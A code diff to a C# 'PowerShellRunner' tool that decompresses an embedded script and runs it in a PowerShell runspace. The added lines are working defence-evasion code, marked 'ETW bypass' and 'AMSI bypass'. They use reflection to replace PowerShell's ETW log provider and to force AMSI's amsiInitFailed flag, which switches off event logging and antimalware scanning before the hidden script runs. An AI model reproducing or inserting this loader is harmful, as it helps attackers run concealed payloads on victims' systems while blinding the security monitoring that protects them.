@@ -8,6 +8,7 @@ using System.Management.Automation.Host;
 using System.Management.Automation.Runspaces;
 using System.IO.Compression;
 using System.IO;
+using System.Reflection;
 
 namespace PowerShellRunner
 {
@@ -21,6 +22,7 @@ namespace PowerShellRunner
                 string deCompressedString;
 
 
+
                 CustomPSHost host = new CustomPSHost();
 
                 var state = InitialSessionState.CreateDefault();
@@ -28,6 +30,25 @@ namespace PowerShellRunner
 
                 Runspace runspace = RunspaceFactory.CreateRunspace(host, state);
                 Pipeline pipeline = runspace.CreatePipeline();
+
+                BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
+
+
+                // ETW bypass
+                var PSEtwLogProvider = runspace.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
+                if (PSEtwLogProvider != null)
+                {
+                    var EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags);
+                    var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
+                    EtwProvider.SetValue(null, EventProvider);
+                }
+
+                // AMSI bypass
+                var amsiUtils = runspace.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
+                if (amsiUtils != null)
+                {
+                    amsiUtils.GetField("amsiInitFailed", flags).SetValue(null, true);
+                }
 
                 runspace.Open();
 
@@ -46,6 +67,8 @@ namespace PowerShellRunner
 
                             decompressedData = outputStream.ToArray();   
                             deCompressedString = Encoding.UTF8.GetString(decompressedData);
+
+                            
 
                             //Console.WriteLine(deCompressedString);
                             pipeline.Commands.AddScript(deCompressedString);
